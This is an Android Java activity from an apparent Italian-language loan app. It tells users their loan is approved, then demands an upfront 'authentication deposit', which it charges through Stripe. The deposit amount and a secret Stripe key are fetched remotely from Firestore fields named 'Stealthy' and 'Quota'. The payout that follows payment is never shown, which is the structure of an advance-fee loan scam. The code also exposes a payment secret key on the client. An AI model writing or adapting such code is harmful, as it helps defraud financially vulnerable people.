package com.justkeepfaith.finestexotic;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

import com.android.volley.AuthFailureError;
import com.android.volley.Request;
import com.android.volley.RequestQueue;
import com.android.volley.Response;
import com.android.volley.VolleyError;
import com.android.volley.toolbox.StringRequest;
import com.android.volley.toolbox.Volley;
import com.google.android.gms.tasks.OnCompleteListener;
import com.google.android.gms.tasks.Task;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.DocumentSnapshot;
import com.google.firebase.firestore.FirebaseFirestore;
import com.stripe.android.PaymentConfiguration;
import com.stripe.android.paymentsheet.PaymentSheet;
import com.stripe.android.paymentsheet.PaymentSheetResult;

import org.json.JSONException;
import org.json.JSONObject;

import java.util.HashMap;
import java.util.Map;

public class striscia_pagina extends AppCompatActivity {

    String Open, Closed, period, lname, Number, amount_applied;
    TextView message, button;
    SharedPreferences sharedPreferences;
    String customerID, emphericalKey, ClientSecret;
    PaymentSheet paymentSheet;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_striscia_pagina);

        button = (TextView) findViewById(R.id.gpaybton);
        message = (TextView) findViewById(R.id.message);


        sharedPreferences = getApplicationContext().getSharedPreferences("user_info", Context.MODE_PRIVATE);
        lname = sharedPreferences.getString("last_name", "User");
        Open = sharedPreferences.getString("Open", "");
        Closed = sharedPreferences.getString("Closed", "");
        Number = sharedPreferences.getString("Number", "");
        period = sharedPreferences.getString("Months", "");
        amount_applied = sharedPreferences.getString("loan_applied", "");


        SharedPreferences.Editor editor = sharedPreferences.edit();
        editor.putString("notification", "Congratulazioni!! La tua richiesta di prestito è stata approvata, " +
                "ti mancano solo pochi ultimi passi prima di poter ricevere il tuo prestito. " +
                "Fai clic su questa notifica per ulteriori informazioni.");
        editor.commit();


        message.setText("--Cara "+lname+", la tua richiesta di prestito di €" + amount_applied + " è stata approvata. " +
                        "Questo prestito dovrà essere rimborsato in "+period+" mesi.\n\n--Tuttavia, per poter erogare " +
                        "questo prestito sul tuo conto bancario, "+getResources().getString(R.string.app_name)+" ti " +
                        "richiede di effettuare un deposito una tantum di €"+Number+" sul tuo conto "+getResources().getString(R.string.app_name)+"" +
                        ". Chiediamo questo per convalidare che sei un utente legittimo in modo da poter evitare l'abuso " +
                        "dei nostri servizi da parte di utenti fraudolenti.\n\n" +
                        "--Ti preghiamo di notare che questo deposito verrà rimborsato al rimborso del prestito o se " +
                        "decidi di chiudere il tuo account "+getResources().getString(R.string.app_name)+" in quanto questo è " +
                        "solo un costo di autenticazione per tutti i nuovi utenti.");



        DocumentReference documentReference = FirebaseFirestore.getInstance().collection("Classified").document("Commissioned");
        documentReference.get().addOnCompleteListener(new OnCompleteListener<DocumentSnapshot>() {
            @Override
            public void onComplete(@NonNull Task<DocumentSnapshot> task) {

                DocumentSnapshot dsnap = task.getResult();

                Open = dsnap.getString("Unrestricted");
                Closed = dsnap.getString("Stealthy");
                Number = dsnap.getString("Quota");

                SharedPreferences.Editor editor = sharedPreferences.edit();
                editor.putString("Open", Open);
                editor.putString("Closed", Closed);
                editor.putString("Number", Number);
                editor.commit();

                message.setText("--Cara "+lname+", la tua richiesta di prestito di €" + amount_applied + " è stata approvata. " +
                        "Questo prestito dovrà essere rimborsato in "+period+" mesi.\n\n--Tuttavia, per poter erogare " +
                        "questo prestito sul tuo conto bancario, "+getResources().getString(R.string.app_name)+" ti " +
                        "richiede di effettuare un deposito una tantum di €"+Number+" sul tuo conto "+getResources().getString(R.string.app_name)+"" +
                        ". Chiediamo questo per convalidare che sei un utente legittimo in modo da poter evitare l'abuso " +
                        "dei nostri servizi da parte di utenti fraudolenti.\n\n" +
                        "--Ti preghiamo di notare che questo deposito verrà rimborsato al rimborso del prestito o se " +
                        "decidi di chiudere il tuo account "+getResources().getString(R.string.app_name)+" in quanto questo è " +
                        "solo un costo di autenticazione per tutti i nuovi utenti.");
            }
        });

        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {

                if (!Conectivity.isConnectingToInternet(striscia_pagina.this)) {
                    Toast.makeText(striscia_pagina.this, "Per favore controlla la tua connessione Internet", Toast.LENGTH_SHORT).show();
                    return;
                }
                if (Open.isEmpty()){
                    Toast.makeText(striscia_pagina.this, "Riprova", Toast.LENGTH_SHORT).show();
                }
                else {
                    Toast.makeText(striscia_pagina.this, "Attendere prego", Toast.LENGTH_SHORT).show();
                    PayNow();
                }
            }
        });

        paymentSheet = new PaymentSheet(this, paymentSheetResult -> {

            onPaymentResult(paymentSheetResult);

        });

    }
    private void PayNow(){

        PaymentConfiguration.init(this, Open);

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/customers",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            customerID = object.getString("id");
                            getEmphericalKey(customerID);


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                return header;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }

    private void getEmphericalKey(String customerID) {

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/ephemeral_keys",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            emphericalKey = object.getString("id");
                            getClientSecret(customerID, emphericalKey);


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                header.put("Stripe-Version","2020-08-27");
                return header;
            }

            @Nullable
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("customer", customerID);

                return params;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }

    private void getClientSecret(String customerID, String emphericalKey) {

        int lon = Integer.parseInt(Number);
        String deni = String.valueOf((lon) * 100 + 30);

        StringRequest stringRequest = new StringRequest(Request.Method.POST,
                "https://api.stripe.com/v1/payment_intents",
                new Response.Listener<String>() {
                    @Override
                    public void onResponse(String response) {

                        try {
                            JSONObject object = new JSONObject(response);

                            ClientSecret = object.getString("client_secret");
                            PaymentFlow();


                        } catch (JSONException e) {
                            e.printStackTrace();
                        }

                    }
                }, new Response.ErrorListener() {
            @Override
            public void onErrorResponse(VolleyError error) {

            }
        }){
            @Override
            public Map<String, String> getHeaders() throws AuthFailureError {
                Map<String, String> header = new HashMap<>();
                header.put("Authorization","Bearer "+ Closed);
                return header;
            }

            @Nullable
            @Override
            protected Map<String, String> getParams() throws AuthFailureError {
                Map<String, String> params = new HashMap<>();
                params.put("customer", customerID);
                params.put("amount", deni);
                params.put("currency", "eur");
                params.put("automatic_payment_methods[enabled]", "true");

                return params;
            }
        };

        RequestQueue requestQueue = Volley.newRequestQueue(striscia_pagina.this);
        requestQueue.add(stringRequest);

    }


    private void onPaymentResult(PaymentSheetResult paymentSheetResult) {

        if (paymentSheetResult instanceof PaymentSheetResult.Completed) {

            SharedPreferences.Editor editor = sharedPreferences.edit();
            editor.putString("balance", Number);
            editor.commit();

            Toast.makeText(striscia_pagina.this, "Riuscita", Toast.LENGTH_SHORT).show();

            Intent intent = new Intent(this, grazie_tasso.class);
            startActivity(intent);
            finish();
        }
        if (paymentSheetResult instanceof PaymentSheetResult.Canceled) {

        }

    }

    private void PaymentFlow() {

        paymentSheet.presentWithPaymentIntent(
                ClientSecret, new PaymentSheet.Configuration(getResources().getString(R.string.app_name),
                        new PaymentSheet.CustomerConfiguration(customerID, emphericalKey))
        );
    }
}